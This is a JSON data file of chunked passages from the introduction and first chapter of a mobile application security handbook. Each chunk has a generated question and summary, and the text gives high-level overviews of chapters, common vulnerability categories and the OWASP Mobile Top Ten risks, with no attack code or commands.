[
  {
    "start": 1,
    "end": 4,
    "text": "Introduction\nMobile computing has changed the game. Your personal data is no longer just stored on your desktop in the\nsanctuary of your office or home. You now carry personally identifiable information, financial data, personal and\ncorporate email, and much more in your pocket, wherever you go. The smartphone is quickly becoming\nubiquitous, and with at least 40 applications installed on the average smartphone the attack surface is\nsignificant.\nSmartphones have become commonplace not only in the consumer markets but also now in the enterprise.\nEnterprise mobile applications extend the corporate environment beyond the workplace, introducing new\nsecurity concerns and exposing organizations to new types of threats. Enterprises embracing “Bring Your Own\nDevice” (BYOD) strategies should be particularly mindful of the array of applications that the smartphone may\nhave installed and run within the corporate network.\nThis book is a practical guide to reviewing the security of mobile applications on the most widely adopted\nmobile operating systems: Apple iOS, Google Android, BlackBerry, and Windows Mobile. It focuses solely on the\nclient-side, examining mobile applications in the context of these devices as opposed to server-side applications,\nwhere security is much more mature and better understood.\nOverview of This Book\nThe focus of this book is highly practical. Although we provide some background theory for you to understand\nthe fundamentals of mobile application vulnerabilities, our primary concern is documenting the techniques you\nneed to master to attack and exploit them. Where applicable, we include real-world examples derived from our\nmany years of experience and from publically documented vulnerabilities.\nIn addition to describing mobile application security vulnerabilities and attack techniques, we describe in detail\nthe defense-in-depth strategies and countermeasures that application developers can use to effectively defend\ntheir applications. This information enables penetration testers, security consultants, and developers alike to\nprovide high-quality remediation advice to application owners.\nIn short, this book is intended to act as an all-encompassing single point of reference for mobile application\nsecurity, bringing together the publicly available knowledge on the attack and defense of mobile applications\nand combining it with the blended experience of the authors.\nHow This Book Is Organized\nThis book is roughly split into the topics covered for each of the mobile device platforms, you can think of it as\nfour books in one! For each of the mobile platforms; we provide a pragmatic approach to performing a mobile\napplication security assessment. First detailing the necessary background information on how to analyze the\napplication itself, followed by detailed information on how to attack the application and the categories of\nvulnerability that affect the relevant platform, finally providing remedial action that can be implemented to\ndevelop secure mobile applications. If you are new to mobile application security, it is recommended that you\nread the book from start to finish, acquiring the knowledge and understanding to tackle later chapters. This can\nbe applied to the relevant chapters for each mobile platform, or the entirety of the book. If you're only interested\nin one specific platform or only a specific area of a platform, you can jump straight into the subsection that\ninterests you. Where applicable, we have included cross-references to other chapters, which can be used to fill\nany gaps in your understanding.\nChapter 1, “Mobile Application (In) Security,” describes the current state of security in mobile applications\ntoday. As an area that has seen explosive and rapid growth over the past few years, security has been\nfrequently overlooked or misunderstood in the fast evolving software lifecycles. As a consequence, mobile\napplication vulnerabilities are rife and commonplace in the application ecosystem. This chapter examines\nthe key attack surfaces for mobile applications, how mobile security has evolved and what standards and\nframeworks exist that can be used to categorize mobile application vulnerabilities. It then provides an\noverview of some mobile security resources that may prove useful in developing your assessment skills.\nFinally, it provides an insight into how mobile application security is, in our opinion, likely to evolve in the\nfuture.\nChapter 2, “Analyzing iOS Applications,” is the first chapter to focus on iOS application assessment. It starts\noff by describing some foundational knowledge on the security features of the iOS platform and briefly\ntouches on how they have been circumvented in the past through jailbreaking. Although jailbreaking\nweakens the security controls of the device, it provides the opportunity to gain interactive access to the\noperating system, which is essential to thoroughly assess the security of an iOS application. This chapter\ndescribes how to access the device, and the file system as well as important concepts such as the Data\nProtection API and Keychain. This chapter also describes a range of further interesting topics, including App\nStore encryption, reverse engineering of iOS binaries, generic exploit, and mitigation features.\nChapter 3, “Attacking iOS Applications,” describes in detail the offensive techniques that can be used to\nattack iOS applications. It provides a brief introduction to Objective-C and Swift, the languages in which iOS\napplications are developed, and then outlines how the Swift and Objective-C runtimes can be manipulated to\naccess and control the internals of an application. We then go on to describe the various types of client-side\ninjection attacks that iOS applications can be susceptible to, including SQL injection, XML injection, and\nXML External Entity injection. It also dives into how data can be transmitted between applications on the\nsame device through Inter Process Communication and how insecurities can arise that leave an application\nat risk of attack.\nChapter 4, “Identifying iOS Implementation Issues,” contains information related to how implementation\nissues specific to the iOS platform can leave applications at risk. This chapter describes how iOS applications\ncan be audited for vulnerabilities arising from improper use of the device's address book, geolocation\nframeworks, and logging system. We also examine iOS specific peculiarities that can leave residual data on a\ndevice and may expose sensitive content, including caching of snapshots, web view data, and pasteboards.\nFinally, the chapter concludes with an overview of the memory corruption issues that affect iOS applications\nand how and to what extent these can be exploited.\nChapter 5, “Writing Secure iOS Applications,” transitions from the attacker’s perspective to that of the\ndefender. In this chapter, we examine the techniques that developers can use in their applications to protect\nagainst manipulation. This chapter also serves as a reference point for professional security assessors who\nneed to offer remedial advice following application assessments. We describe how to securely implement\nencryption, erase data from both memory and the file system, and embed binary protections such as tamper\nproofing, jailbreaking, and runtime validation.\nChapter 6, “Analyzing Android Applications,” is the first section in a series of chapters on the Google Android\nplatform. It starts by providing the necessary background on the security features of the platform, including\ncode signing, sandboxing and a detailed description of the permission model. With the basics covered, we go\non to examine how Android devices can be rooted to provide interactive super user access to the device. We\nalso examine how Android applications are packaged, loaded onto devices, and some of the tools that can be\nused to build a test environment. The chapter concludes by describing the different ways packages are\ncompiled and how security assessments can be conducted by decompiling and examining the application\npackages.\nChapter 7, “Attacking Android Applications,” provides a detailed description of the common areas of\nvulnerability in Android applications, along with the techniques to attack and exploit them. This chapter\ndelves into many Android-specific attack categories, including exploitation of insecure services, content\nproviders, broadcasts, intents, and activities. The chapter also examines how the Android runtime can be\nmanipulated, exploring the various frameworks that can be used to implement function hooking in the Java\nVirtual Machine with sample use cases and practical examples. We also address perhaps two of the most\nimportant areas in mobile security, file system storage, and network communications. We explore how file\nand folder permissions can be exploited to leak sensitive information, how poor cryptographic practices can\nundermine secure storage, and how poorly implemented network access can be exploited from public or\ninsecure networks. Finally, this chapter concludes with an insight into JavaScript interfaces, an area that has\ncome under close scrutiny in 2014, and one that has exposed a significant number of Android devices to\nremote compromise.\nChapter 8, “Identifying Android Implementation Issues,” teaches you how to become an Android hacker. It\nprovides practical advice on how to identify vulnerabilities in OEM device applications, how to find and\nexploit powerful packages, and how to leverage privilege escalations to compromise other applications or, in\nsome circumstances, the device itself. We also examine how to exploit applications from the network, with\ninsecurities in URI handlers, JavaScript bridges, handling of SSL certificates, and custom update\nmechanisms. This chapter also explores how to use Drozer, the Android attack tool, to gain access to a\ndevice, including chaining of remote and local exploits and the post exploitation activities that can be\nperformed.\nChapter 9, “Writing Secure Android Applications,” concludes the series of Android chapters and, similarly to\nthe iOS counterpart, provides a basis for which defensive advice can be offered. We provide security\nprofessionals and developers detailed instructions on how to correctly implement encryption, perform root\ndetection, and protect intellectual property by obfuscating code. At the end of the chapter, an application\nchecklist is provided that can be used as a reference point when auditing an Android application.\nChapter 10, “Analyzing Windows Phone Applications,” details the essential “need to know” knowledge for the\nWindows Phone (WP8) platform and application ecosystem. In this section, we examine the fundamental\nsecurity protections that are employed by the platform, including exploit mitigation features and application\ncapabilities. We then explain the inner workings of WP8 applications, how to develop, build, compile, and\nrun them along with the essential toolkit needed to set up a test environment. We conclude with an analysis\nof the Windows Data Protection API (DPAPI) and how misconfigurations in the protection flags can leave\napplication content at risk.\nChapter 11, “Attacking Windows Phone Applications,” provides an in-depth analysis of the common\ninsecurities that occur with WP8 applications. It covers perhaps the most important and relevant topics that\nyou will need to learn in order to hack a Windows Phone application. This chapter examines and explains\ntransport security in WP8 applications, how to intercept network communications, and how to bypass\nprotection mechanisms such as certificate pinning. We also delve into reverse engineering of WP8\napplications, including both native and managed code components and how information gained from this\nallows you to manipulate application behavior by patching application code. An important skill for\nprofessional security assessors reviewing mobile applications is the ability to identify the key data entry\npoints in an application. This chapter explains how to analyze WP8 applications to identify data entry points,\nand how when tainted data enters an application it can lead to serious security vulnerabilities. Having\nidentified the various entry points that can exist, we explore and examine the various injection attacks that\ncan be exploited, including SQL injection, injection into web browser controls, XML-based injection, and\ninjection into file handling routines.\nChapter 12, “Identifying Windows Phone Implementation Issues,” deals with the common issues that arise\nthrough insecurely implemented WP8 applications. In particular, we focus on insecurities that arise through\nhandling of log data, lack of protections on the clipboard, caching in keyboard and web browser controls, and\ngeo-location leakages. This chapter provides security professionals and developers with the required\nknowledge to audit WP8 applications for not only the misuse of the platform APIs but also how to identify\nmemory corruption issues. We examine the various types of memory corruption that can occur in WP8\napplications, including the implications of traditional corruption bugs, read access violations, information\nleaks, and issues that arise in managed c# code.\nChapter 13, “Writing Secure Windows Phone Applications,” like its counterparts on iOS and Android, details\nthe necessary information about to develop secure WP8 applications. It covers the fundamental practices\nthat application developers should be including in WP8 applications. If you're only looking for remediation\nand hardening advice, feel free to jump straight into this chapter. This chapter also examines how to securely\nimplement encryption, securely erase data from both memory and the file system, and how to implement\nbinary protections. We provide in-depth analysis on anti-tamper implementations, available compiler\nprotections, and WP8 application obfuscation, none of which are widely documented in the public domain.\nChapter 14, “Analyzing BlackBerry Applications,” is the backbone of the BlackBerry section, and provides the\nfoundational knowledge needed to understand the different types of BlackBerry applications that exist and\nhow they are developed and distributed. We also examine the BlackBerry platform itself, providing an in-\ndepth evaluation of the core platform security features, including sandboxing, data-at-rest encryption, and\nprocess-level sandboxing. This chapter also details how to build a test environment using the simulator and\ndeveloper mode, with some analysis of the Dingleberry jailbreak exploit. We explain how to access the\ndevice, where content can be found and the various files and file types that you will encounter when\nexploring your BlackBerry. We then conclude by discussing the Security Builder API, how and when\ntransport insecurities occur, how certificate pinning works, and some of the strategies that can be used to\nbypass it.\nChapter 15, “Attacking BlackBerry Applications,” provides some much needed insight into the world of\nBlackBerry application security. In this chapter we discuss how the application runtime functions, including\nimportant subjects such as the System API and the various programming frameworks that BlackBerry\napplications take advantage of. We then examine the Inter-Process Communication (IPC) mechanisms that\nexist, how BlackBerry 10 applications differ from previous implementations, and detail how insecurely\nimplemented IPC can be exploited by other applications on the device.\nChapter 16, “Identifying BlackBerry Application Implementation Issues,” discuses the common issues that\narise in BlackBerry applications due to misuse of BlackBerry APIs. This chapter may be of particular interest\nto developers, and investigates the various types of information leakages that an application can be\nsusceptible to with a particular focus on Personally Identifiable Information. Topics that are also explored\nare system logging and a brief review of memory corruption vulnerabilities that affect BB10 applications.\nChapter 17, “Writing Secure BlackBerry Applications,” is of particular relevance to application developers.\nThis chapter pulls together some of the techniques that can be used to improve the security of BlackBerry\napplications. We discuss strategies for performing secure deletion of data, both in memory and from the\nfilesystem, and how to securely implement encryption. Where applicable, we provide practical examples\nusing both built-in APIs and custom developed functions.\nChapter 18, “Cross Platform Applications,” examines a growing trend in mobile development and cross-\nplatform mobile applications. We explore the various implementations that currently exist, and provide a\nbreakdown of the functionality that they offer. We then detail the various vulnerability categories that affect\ncross-platform applications, with practical examples on how to exploit these to perform malicious actions in\nApache Cordova.\nWho Should Read This Book\nThis book's primary audience is anyone who has a personal or professional interest in attacking mobile\napplications. It also caters to anyone responsible for the development of mobile applications. This book not only\nprovides a detailed analysis of how to attack and secure iOS, Android, BlackBerry, and Windows Phone\napplications, but also serves as a reference point for generic mobile application security regardless of operating\nplatform.\nIn the course of illustrating many categories of security flaws, we provide code extracts showing how\napplications can be vulnerable. These examples are simple enough that you can understand them without any\nprior knowledge of the language in question. But they are most useful if you have some basic experience with\nreading or writing code.\nTools You Will Need\nThis book is strongly geared toward hands-on practical techniques that you can use to attack mobile\napplications. After reading this book you will understand the different types of vulnerabilities that affect mobile\napplications and have the practical knowledge to attack and exploit them. The emphasis of the book is on\npractical and human-driven exploitation as opposed to running automated tools on the target application.\nThat said, you will find several tools useful, and sometimes indispensable, when performing the tasks and\ntechniques we describe. All of these are available on the Internet. We recommend that you download and\nexperiment with each tool as you read about it.\nWhile in most cases it is possible to follow the practical examples in a simulated or emulated environment,\nthere is no substitute for running an application on a physical device. Therefore, we would recommend that,\nwhere possible, the examples be followed on a real device.\nWhat's on the Website\nThe companion website for this book at www.mobileapphacker.com, which you can also link to from\nwww.wiley.com/go/mobileapplicationhackers, contains several resources that you will find useful in the course\nof mastering the techniques we describe and using them to attack actual applications. In particular, the website\ncontains access to the following:\nSource code for some of the scripts we present in the book\nA list of current links to all the tools and other resources discussed in the book\nA handy checklist of the tasks involved in attacking a typical application\nAnswers to the questions posed at the end of each chapter",
    "question": "What is the main focus and purpose of this book on mobile application security?",
    "summary": "This book provides a practical guide to securing mobile applications across iOS, Android, BlackBerry, and Windows Phone. It covers both attack techniques and defense strategies, helping developers and security professionals identify and mitigate vulnerabilities. The book is organized by platform, offering in-depth analysis of security issues, attack methods, and ways to write more secure applications. It also includes tools and resources for hands-on learning and real-world application testing."
  },
  {
    "start": 5,
    "end": 7,
    "text": "CHAPTER 1\nMobile Application (In)security\nThere is little doubt that mobile computing has changed the world; in particular, the way you work, interact, and\nsocialize will never be the same again. It has brought infinite possibilities to your fingertips, available all the\ntime. The ability to do your online banking, check your e-mail, play the stock market and much, much more are\njust a swipe away. Indeed, application development is now so popular that Apple’s trademark, “There’s an app\nfor that” is bordering on reality.\nThis chapter takes a look how mobile applications have evolved and the benefits that they provide. It presents\nsome metrics about the fundamental vulnerabilities that affect mobile applications, drawn directly from our\nexperience, demonstrating that the vast majority of mobile applications are far from secure. We then examine a\nmeans to categorize these vulnerabilities based on the Open Web Application Security Project (OWASP) Top 10\nmobile security risks. We also provide a high-level overview of some of the open source mobile security tools\nendorsed by OWASP, how you can use them to identify some of the issues detailed in the project, and where to\nfind them. Finally, we describe the latest trends in mobile application security and how we expect this area to\ndevelop in the future.\nThe Evolution of Mobile Applications\nThe first mobile phone applications were developed by handset manufacturers; documentation was sparse, and\nlittle information existed in the public domain on the operating internals. This can perhaps be attributed to a\nfear from the vendors that opening the platforms to third-party development might have exposed trade secrets\nin what was not yet a fully developed technology. The early applications were similar to many of the\nmanufacturer-based apps found on today’s phone, such as contacts and calendars, and simple games such as\nNokia’s popular Snake.\nWhen smartphones emerged as the successor to personal digital assistants (PDAs), application development\nreally began to take off. The growth of mobile applications can perhaps be directly attributed to the increased\nprocessing power and capabilities of the smartphone combined with the growing demand for functionality\ndriven by the consumer market. As smartphones have evolved, mobile applications have been able to take\nadvantage of the enhancements of the platforms. Improvements in the global positioning system (GPS), camera,\nbattery life, displays, and processor have all contributed to the feature-rich applications that we know today.\nThird-party application development came to fruition in 2008 when Apple announced the first third-party\napplication distribution service, the App Store. This followed on from the company’s first smartphone, the\niPhone, which had been released the previous year. Google closely followed with the Android Market, otherwise\nknown today as Google Play. Today, a number of additional distribution markets exist, including the Windows\nPhone Store, the Amazon Appstore, and the BlackBerry World to name but a few.\nThe increased competition for third-party application development has left the developer markets somewhat\nfragmented. The majority of mobile applications are platform specific, and software vendors are forced to work\nwith different operating systems, programming languages, and tools to provide multi-platform coverage. That is,\niOS applications traditionally have been developed using Objective-C, Android, and BlackBerry applications\nusing Java (up until BlackBerry 10, which also uses Qt) and Windows Phone applications using the .NET\nFramework. This fragmentation can often leave organizations requiring multiple development teams and\nmaintaining multiple codebases.\nHowever, a recent increase has occurred in the development of cross-platform mobile applications as\norganizations look to reduce development costs and overheads. Cross-platform frameworks and development of\nHTML5 browser-based applications have grown in popularity for these exact reasons and, in our opinion, will\ncontinue to be increasingly adopted.\nCommon Mobile Application Functions\nMobile applications have been created for practically every purpose imaginable. In the combined Apple and\nGoogle distribution stores alone, there are believed to be more than 2 million applications covering a wide range\nof functions, including some of the following:\nOnline banking (Barclays)\nShopping (Amazon)\nSocial networking (Facebook)\nStreaming (Sky Go)\nGambling (Betfair)\nInstant Messaging (WhatsApp)\nVoice chat (Skype)\nE-mail (Gmail)\nFile sharing (Dropbox)\nGames (Angry Birds)\nMobile applications often overlap with the functionality provided by web applications, in many cases using the\nsame core server-side APIs and displaying a smartphone-compatible interface at the presentation layer.\nIn addition to the applications that are available in the various distribution markets, mobile applications have\nbeen widely adopted in the business world to support key business functions. Many of these applications\nprovide access to highly sensitive corporate data, including some of the following, which have been encountered\nby the authors during consultancy engagements:\nDocument storage applications allowing users to access sensitive business documents on demand\nTravel and expenses applications allowing users to create, store, and upload expenses to internal systems\nHR applications allowing users to access the payroll, time slips, holiday information, and other sensitive\nfunctionality\nInternal service applications such as mobile applications that have been optimized to provide an internal\nresource such as the corporate intranet\nInternal instant messaging applications allowing users to chat in real time with other users regardless of\nlocation\nIn all of these examples, the applications are considered to be “internal” applications and are typically developed\nin-house or specifically for an organization. Therefore, many of these applications require virtual private\nnetwork (VPN) or internal network access to function so that they interact with core internal infrastructure. A\ngrowing trend in enterprise applications is the introduction of “geo fencing” whereby an application uses the\ndevice’s GPS to ascertain whether a user is in a certain location, for example, the organization’s office, and then\ntailors or restricts functionality based on the result.\nBenefits of Mobile Applications\nIt is not difficult to see why mobile applications have seen such an explosive rise in prominence in such a short\nspace of time. The commercial incentives and benefits of mobile applications are obvious. They offer\norganizations the opportunity to reach out to end users almost all the time and to much wider audiences due to\nthe popularity of smartphones. However, several technical factors have also contributed to their success:\nThe foundations of mobile applications are built on existing and popular protocols. In particular, the use of\nHTTP is widely adopted in mobile deployments and is well understood by developers.\nThe technical advancements of smartphones have allowed mobile applications to offer more advanced\nfeatures and a better user experience. Improvements in screen resolution and touch screen displays have\nbeen a major factor in improving the interactive user experience, particularly in gaming applications.\nEnhancements in battery life and processing power allow the modern smartphone to run not just one but\nmany applications at once and for longer. This is of great convenience to end users as they have a single\ndevice that can perform many functions.\nImprovements in cellular network technologies have resulted in significant speed increases. In particular,\nwidespread 3G and 4G coverage has allowed users to have high-speed Internet access from their\nsmartphones. Mobile applications have taken full advantage of this to provide access to an array of online\nservices.\nThe simplicity of the core technologies and languages used in mobile development has helped with the\nmobile revolution. Applications can be developed using popular and mature languages such as Java, which\nare well understood and have a large user base.\nMobile Application Security\nMobile applications are affected by a range of security vulnerabilities, many of which are inherited from\ntraditional attacks against web and desktop applications. However, several other classes of attack are specific to\nthe mobile area and arise due to the way in which mobile applications are used and the relatively unique entry\npoints and the attack surfaces that these apps create. Consider the possible attack surfaces for a mobile\napplication that developers should be aware of and look to defend against:\nMost mobile applications perform some kind of network communication, and due to the nature in which\nmobile devices are used, this communication may often occur over an untrusted or insecure network such as\nhotel or café Wi-Fi, mobile hotspot, or cellular. Unless data is adequately secured in transit, it may expose an\napplication to a number of possible risks, including disclosure of sensitive data and injection attacks.\nMobile devices are carried with you wherever you go, creating many opportunities for them to be lost or\nstolen. Mobile application developers must recognize the risks from data recovery attempts against a device’s\nfilesystem. Any residual content that an application leaves on the filesystem, whether it’s through persistent\nstorage or temporary caching, can potentially expose sensitive data to an attacker.\nA scenario that is fairly unique to mobile applications is awareness of threats originating from the host\ndevice. Malware is rife within the mobile space, particularly in the unofficial distribution markets, and\ndevelopers must be conscious of attacks from other applications.\nMobile applications can derive input from a large number of possible sources, which creates a significant\nnumber of possible entry points. For example, seeing applications accept data from one or many of the\nfollowing is not uncommon: near field communication (NFC), Bluetooth, camera, microphone, short\nmessage service (SMS), and universal serial bus (USB) or quick response (QR) codes to name but a few.\nThe most serious attacks against mobile applications are those that expose sensitive data or facilitate a\ncompromise of the host device. These vulnerabilities are more often than not limited to the mobile end user’s\ndata and device as opposed to all users of the service. Although server-side vulnerabilities pose the greatest risk\nto mobile application deployments as a whole because they can expose unrestricted access to back end systems,\nthese issues are well documented and understood. Server-side vulnerabilities in mobile applications are not\ncovered in the context of this book; however, we highly recommend The Web Application Hacker’s Handbook\n(http://eu.wiley.com/WileyCDA/WileyTitle/productCd-1118026470.html) if you would like to know more\nabout this attack category.\nMobile application security is still somewhat misunderstood and has not fully matured as an area of focus;\nindeed, the majority of mobile applications are still considered insecure. We have tested hundreds of mobile\napplications in recent years and one or more serious security issues affected the majority of them. Figure 1.1\nshows what percentage of these mobile applications tested since 2012 were found to be affected by some\ncommon categories of client-side vulnerability:\nInsecure data storage (63%)—This category of vulnerability incorporates the various defects that lead to\nan application’s storing data on the mobile device in either cleartext, an obfuscated format, using a hard-\ncoded key, or any other means that can be trivially reversed by an attacker.\nInsecure transmission of data (57%)—This involves any instance whereby an application does not use\ntransport layer encryption to protect data in transit. It also includes cases where transport layer encryption is\nused but has been implemented in an insecure manner.\nLack of binary protections (92%)—This flaw means that an application does not employ any form of\nprotection mechanism to complicate reverse engineering, malicious tampering, or debugging.\nClient-side injection (40%)—This category of vulnerability describes scenarios where untrusted data is\nsent to an application and handled in an unsafe manner. Typical origins of injection include other\napplications on the device and input populated into the application from the server.\nHard-coded passwords/keys (23%)—This flaw arises when a developer embeds a sensitive piece of\ninformation such as a password or an encryption key into the application.\nLeakage of sensitive data (69%)—This involves cases where an application unintentionally leaks\nsensitive data through a side channel. This specifically includes data leakages that arise through use of a\nframework or OS and occur without the developer’s knowledge.\nFigure 1.1 The incidence of some common mobile application vulnerabilities recently tested by the authors\nKey Problem Factors\nThe core security problems in mobile applications arise due to a number of factors; however, vulnerabilities\ntypically occur when an application must handle or protect sensitive data or process data that has originated\nfrom an untrusted source. However, several other factors have combined to intensify the problem.\nUnderdeveloped Security Awareness\nUnlike most web applications where the attack surface is limited to user-derived input, mobile application\ndevelopers have a number of different scenarios to consider and protect against. Mobile application\ndevelopment is fairly unique when compared to the development of other applications in that developers cannot\ntrust the host operating system or even their own application. Awareness of the many attack surfaces and\ndefensive protections is limited and not well understood within the mobile development communities.\nWidespread confusion and misconceptions still exist about many of the core concepts involved in mobile\nsecurity. A prime example is that many developers believe that they don’t need to encrypt or protect data that is\npersistently stored on the device because it is encrypted through the data-at-rest encryption that comes standard\nwith many devices. As you will discover, this assumption is not accurate and can expose sensitive user content.\nEver-Changing Attack Surfaces\nResearch into mobile device and application security is a continually evolving area in which ideas are regularly\nchallenged and new threats and concepts discovered. Particularly on the device side, discovering new\nvulnerabilities that may undermine the accepted defenses that an application employs is common. A prime\nexample of this was the discovery of Apple’s “goto fail” vulnerability (http://support.apple.com/kb/HT6147),\nwhich undermined the integrity of what was previously believed to be a secure communications channel. In this\ninstance even recommended protections such as certificate pinning could be bypassed, which lead to many\ndevelopers and security professionals researching and implementing secondary encryption schemes to protect\ndata inside the SSL/TLS channel. These types of vulnerabilities demonstrate how on-going research can affect or\nchange the threat profile for an application even partway through a development project. A development team\nthat begins a project with a comprehensive understanding of the current threats may have lost this status and\nhave to adapt accordingly before the application is completed and deployed.\nEconomic and Time Constraints\nMost application development projects are governed by strict resource and time constraints, and mobile\napplication development is no exception. The economics of an application development project often mean that\nhaving permanent security expertise throughout the development process is infeasible for companies,\nparticularly in smaller organizations that on the whole tend to leave security testing until late in a project’s\nlifecycle. Indeed, smaller organizations typically have much smaller budgets, which means they are often less\nwilling to pay for expensive security consulting. A short time-constrained penetration test is likely to find the\nlow-hanging fruit, but it is likely to miss more subtle and complex issues that require time and patience to\nidentify. Even in projects with a permanent security presence, strict time constraints may mean that adequately\nreviewing every release can prove a challenging task. Development methods such as Agile, in which there are\nmany iterations in a short space of time, can often intensify this challenge.\nCustom Development\nMobile applications are typically developed by either in-house developers or third-party development teams, or\nin some cases a combination of the two. In general, when organizations are regularly developing multiple\napplications, components that have been thoroughly tested will find themselves being reused across projects;\nthis often promotes more robust and secure code. However, even when applications reuse established\ncomponents from other projects, seeing libraries or frameworks bolted on to the project that may not have been\ndeveloped by the project team is not uncommon. In these cases, the main project developers may not have full\nawareness of the code and misuse could lead to the introduction of security defects. Furthermore, in some cases\nthe libraries may contain vulnerabilities themselves if they have not been thoroughly security tested. An\nexample of this is the addJavascriptInterface vulnerability that affected the Android Webview component and\nwhen exploited resulted in a remote compromise of the device. Research found that this vulnerability was\nbundled with the libraries used to provide ad integration and potentially affected a significant number of\napplications (https://labs.mwrinfosecurity.com/blog/2013/09/24/webview-addjavascriptinterface-remote-\ncode-execution/).\nThe OWASP Mobile Security Project\nThe OWASP Mobile Security Project (https://www.owasp.org/index.php/OWASP_Mobile_Security_Project) is an\ninitiative created by the not-for-profit group OWASP that is well known for its work in web application security.\nGiven the many similarities between mobile applications and web applications, OWASP is a natural fit for\npromoting and raising awareness of mobile security issues.\nThe project provides a free centralized resource that classifies mobile security risks and document development\ncontrols to reduce their impact or likelihood of exploitation. The project focuses on the application layer as\nopposed to the security of the mobile platform; however, risks inherent with the use of the various mobile\nplatforms are taken into consideration.\nOWASP Mobile Top Ten\nSimilar to the renowned OWASP Top 10, the Mobile Security Project defines an equivalent Top 10 Mobile Risks.\nThis section of the project broadly identifies and categorizes some of the most critical risks in mobile application\nsecurity. We will now loosely summarize each of the risks described in the OWASP Top 10; for a more detailed\ndescription and remedial advice, review the project page, as shown in Figure 1.2, on the OWASP wiki\n(https://www.owasp.org/index.php/OWASP_Mobile_Security_Project#tab=Top_10_Mobile_Risks).\nFigure 1.2 OWASP Top 10 Mobile Risks\nThe top 10 risks to mobile applications as defined by the OWASP Mobile Security Project are\nM1: Weak Server-Side Controls—This category of risk is rated as the most critical issue to affect mobile\napplications. The impact is rated as severe and rightly so; a serious defect in a server-side control can have\nsignificant consequences to a business. This risk encompasses any vulnerability that may occur on the server\nside including in mobile web services, web server configurations, and traditional web applications. The\ninclusion of this risk in the mobile Top 10 is somewhat controversial because it does not take place on the\nmobile device, and separate projects exist that explicitly cover web application risks. Although we\nacknowledge the severity of this risk, it is not detailed in this book because it has previously been well\ndocumented in other publications (http://eu.wiley.com/WileyCDA/WileyTitle/productCd-\n1118026470.html).\nM2: Insecure Data Storage—This risk relates to circumstances when an application stores sensitive data\non the mobile device in either plaintext or a trivially reversible format. The impact of this risk is rated as\nsevere and can typically lead to serious business risks such as identity theft, fraud, or reputational damage.\nIn addition to disclosure through physical access to the device, this risk also incorporates filesystem access\nthat can be attained through malware or by otherwise compromising the device.\nM3: Insufficient Transport Layer Protection—This flaw pertains to the protection of network traffic\nand would be relevant to any situation whereby data is communicated in plaintext. It is also applicable in\nscenarios where traffic is encrypted but has been implemented in an insecure manner such as permitting\nself-signed certificates, performing insufficient validation on certificates, or using insecure cipher suites.\nThese types of issues can typically be exploited from an adversary positioned within the local network or\nfrom within the carrier’s network; physical access to the device is not required.\nM4: Unintended Data Leakage—This problem manifests in cases when a developer inadvertently places\nsensitive information or data in a location on the mobile device where it is easily accessible by other\napplications. More often than not this risk arises as a side effect from the underlying mobile platform and is\nlikely to be prevalent when developers do not have intimate knowledge of how the operating system can\nstore data. Frequently seen examples of unintended data leakage include caching, snapshots, and application\nlogs.\nM5: Poor Authorization and Authentication—This category of risk relates to authentication and\nauthorization flaws that can occur in either the mobile application or the server-side implementation. Local\nauthentication within a mobile application is relatively common, particularly in applications that provide\naccess to sensitive data and need to operate in an offline state. Where appropriate security controls have\nbeen missed, the possibility exists that this authentication can be bypassed to provide access to the\napplication. This risk also pertains to authorization flaws that can occur on the server-side application and\nmay allow a user to access or execute functionality outside the scope of her privilege level.\nM6: Broken Cryptography—The concept is widely accepted that applications that store data on the\nmobile device should encrypt it to maintain the confidentiality of the data. This risk addresses those cases\nwhere encryption has been implemented, but weaknesses exist in the implementation. In a worst-case\nscenario, this issue may allow an attacker to elicit portions of the plaintext or even retrieve all the original\ndata in its unencrypted form. More often than not these risks arise from poor key management processes\nsuch as baking a private key into the application, hard-coding a static key, or using a key that can be trivially\nderived from the device, such as the Android device identifier.\nM7: Client-Side Injection—Injection attacks can occur when a mobile application accepts input from any\nuntrusted source; this may be internal to the mobile device such as from another application, or external,\nsuch as from a server-side component. As an example, consider a social networking application that allows\nmany users to post updates. The mobile application retrieves other users’ status updates from the site and\ndisplays them. If an attacker were able to create a malicious update that was stored on the site and then later\nretrieved by other mobile application users and populated into a web view or client-side database, the\npotential exists for an injection attack to occur.\nM8: Security Decisions Via Untrusted Inputs—This risk covers cases where a security decision is made\nbased on input that has originated from a trusted source. In most cases this risk will relate to an Inter-\nProcess Communication (IPC) mechanism. For example, consider an organization that has a suite of\napplications that all communicate with the same back end. The developer decides that rather than having\neach application prompt the user for credentials, the applications can share a single session token. To allow\neach of the other applications access to the session token, an IPC mechanism such as a content provider is\nused to share the token. If the IPC mechanism is not properly secured, any other malicious application on\nthe device could potentially query the IPC interface to retrieve the session token and compromise the user’s\nsession.\nM9: Improper Session Handling—Session management is an important concept in application\ndevelopment; the session is the mechanism that the server side uses to maintain state over stateless\nprotocols such as HTTP or SOAP. This risk incorporates any vulnerability that results in the session tokens\nbeing exposed to an adversary and somewhat overlaps the concepts in “A2 – Broken Authentication and\nSession Management” in the web application Top 10 project.\nM10: Lack of Binary Protections—This risk addresses the defensive protections that a developer can and\nin many cases should build into a mobile application. Binary protections will typically attempt to slow down\nan adversary that is attempting to analyze, reverse-engineer, or modify an application’s binary code.\nThe Top 10 project is undoubtedly a useful resource for raising awareness of the types of vulnerabilities that can\noccur in mobile applications. As mobile application security continues to grow we expect that the top 10 project\nwill evolve to cover new threats as they are discovered, and play an even more important role in educating\ndevelopers and security professionals.\nOWASP Mobile Security Tools\nWhether their purpose is for simply supplementing manual assessments, providing a framework for the\ndevelopment of other tools, or as a resource to offer remedial or hardening advice for developers, tools are an\nimportant part of any security professional’s arsenal. The OWASP Mobile Security Project has developed a\nnumber of open source security tools\n(https://www.owasp.org/index.php/OWASP_Mobile_Security_Project#tab=Mobile_Tools) for the community\nthat you may find useful in your learning. We briefly describe each of them now:\niMAS (https://www.owasp.org/index.php/OWASP_iMAS_iOS_Mobile_Application_Security_Project)\n—Created by the MITRE Corporation, this project is an open source secure application framework for iOS. It\nprovides an ideal resource for developers or security professionals who want to learn or understand how to\nimplement security controls for the iOS platform. The goal of the project is to demonstrate and provide\nimplementations protecting iOS applications and data beyond the Apple-provided security model and as a\nconsequence reduce an adversary’s ability to reverse engineer, manipulate, and exploit an application. To\nachieve this goal, the project has created a number of open source implementations that address several\nareas of common vulnerability, including in-application passcodes, jailbreak detection, debugging protection,\nand runtime validation. Although we delve into some of these topics in great detail in Chapters 2 and 3, the\niMAS project is certainly a useful resource for learning defensive techniques or as a reference for developers.\nGoatDroid (https://www.owasp.org/index.php/Projects/OWASP_GoatDroid_Project)—The GoatDroid\nproject developed by Jack Mannino and Ken Johnson is a 